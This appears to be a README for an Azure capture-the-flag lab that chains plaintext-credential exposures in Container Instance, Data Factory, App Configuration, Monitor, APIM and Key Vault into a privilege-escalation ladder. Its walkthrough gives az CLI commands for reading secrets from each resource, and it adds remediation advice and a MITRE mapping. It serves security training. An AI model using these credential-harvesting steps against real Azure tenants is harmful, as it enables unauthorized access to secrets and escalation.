# Gatekeeper Chain — Flag-Gated RBAC Over the Plaintext-Credential Scenarios

**Provider:** Azure | **Category:** Privilege Escalation / Chained

## Scenario

This lab consolidates the individual "plaintext credentials in an Azure
resource" scenarios into a **single flag-gated privilege-escalation ladder**.

You start with an Azure AD account that has **no access to anything**. A
self-service "gatekeeper" app grants you a real Azure role in exchange for the
previous stage's flag — and crucially, each grant is **scoped to exactly one
resource**, so you can only ever read the next scenario, not all of them at once.
Submit a flag, gain access to the next service, read its plaintext credential
(which is the next flag), submit that, and climb until you reach the Key Vault.

The gatekeeper is a container with a **User Access Administrator** managed
identity, so the role grants are genuine.

## The ladder

```
Bootstrap   public blob (anonymous)            --submit--> Reader on the Container Instance
Stage 1     Container Instance env (Reader)    --submit--> Reader on the Data Factory
Stage 2     Data Factory linked service (Reader)--submit--> App Configuration Data Reader
Stage 3     App Configuration (Data Reader)    --submit--> Reader on the Monitor action group
Stage 4     Monitor action group (Reader)      --submit--> Reader on the APIM service
Stage 5     APIM named value (Reader)          --submit--> Key Vault Secrets User
Final       Key Vault secret (Secrets User)               the flag
```

APIM is placed last (before the vault) on purpose: it is the slowest resource to
provision, so it has the most time to be ready before a player reaches it.

Each stage is one of the standalone labs' mechanisms (`apim_named_value`,
`app_configuration_secrets`, `container_instance_env`,
`data_factory_linked_service`, `monitor_action_group`) reusing their original
flags, wired together so the credential you read is the key to the next door.

## Walkthrough

The deploy prints the attacker credentials, the gatekeeper URL, and the public
starting blob.

> APIM (Consumption tier) and the gatekeeper's first boot add a few minutes to
> the deploy. Each granted role also takes **1–2 minutes** to propagate. If a
> step says "authorization failed", wait and retry — it's RBAC catching up.

### Bootstrap — first flag (no credentials needed)

```bash
curl -s "https://<storage-account>.blob.core.windows.net/public/welcome.txt"
```

Submit it to the gatekeeper, then log in as the attacker (once):

```bash
GK="<gatekeeper-url>"
curl -s -X POST "$GK/unlock" -H 'Content-Type: application/json' \
  -d '{"flag":"CUMULONIMBUS{g4t3k33p3r_b00tstr4p}"}'

az login --username <attacker_upn> --password <attacker_password>
```

### Stage 1 — Container Instance env vars (Reader on the container)

```bash
az container show -g <rg> -n <container-group> \
  --query "containers[0].environmentVariables"
```

`SECRET_FLAG` is the flag; `NEXT_HOP` names the Data Factory. Submit → unlocks
**Reader on the Data Factory**.

### Stage 2 — Data Factory linked service (Reader)

```bash
az extension add --name datafactory 2>/dev/null
az datafactory linked-service show -g <rg> --factory-name <adf-name> \
  --name DataLakeConnection --query properties.typeProperties.connectionString
```

The `AccountKey=` in the connection string is the flag; the `description` names
the App Configuration store. Submit → unlocks **App Configuration Data Reader**.

### Stage 3 — App Configuration (Data Reader)

```bash
az appconfig kv list --name <config-store> --auth-mode login --all -o table
```

`secrets/api-key` is the flag; `secrets/next-hop` names the Monitor action group.
Submit the flag → unlocks **Reader on the Monitor action group**.

### Stage 4 — Monitor action group webhook token (Reader)

```bash
az monitor action-group show -g <rg> -n <action-group> \
  --query "webhookReceivers"
```

The `security-alerts` webhook URL contains the flag in its `token=` parameter;
the `apim-pointer` webhook names the APIM service. Submit the flag → unlocks
**Reader on the APIM service**.

### Stage 5 — APIM named value (Reader on the APIM service)

```bash
az apim nv show -g <rg> --service-name <apim-name> --named-value-id flag-key --query value -o tsv
# the `next-hop` named value gives the Key Vault name and secret
```

Submit that flag → unlocks **Key Vault Secrets User**.

### Final — Key Vault secret

```bash
az keyvault secret show --vault-name <key-vault> --name app-flag --query value -o tsv
```

That value is the flag.

## Deployer requirement

The gatekeeper's managed identity is granted **User Access Administrator** on the
resource group. Creating that role assignment requires the **service principal
running the deployment to be Owner (or User Access Administrator)** on the
subscription — plain Contributor cannot delegate role-assignment rights and the
deploy will fail at that step.

## How to Fix in Production

- Don't expose a self-service endpoint that can assign roles; gate any such flow
  behind authentication and approval (PIM), and never give an internet-facing
  workload **User Access Administrator** / **Owner**.
- The per-stage lessons are the standalone labs': don't store secrets in APIM
  non-secret named values, App Configuration key-values, container env vars,
  Data Factory inline connection strings, or Monitor webhook URLs. Use Key Vault
  references and mark sensitive values as secret.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Account Manipulation: Additional Cloud Roles | [T1098.003](https://attack.mitre.org/techniques/T1098/003/) |
| Valid Accounts: Cloud Accounts | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) |
| Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) |
| Cloud Infrastructure Discovery | [T1580](https://attack.mitre.org/techniques/T1580/) |
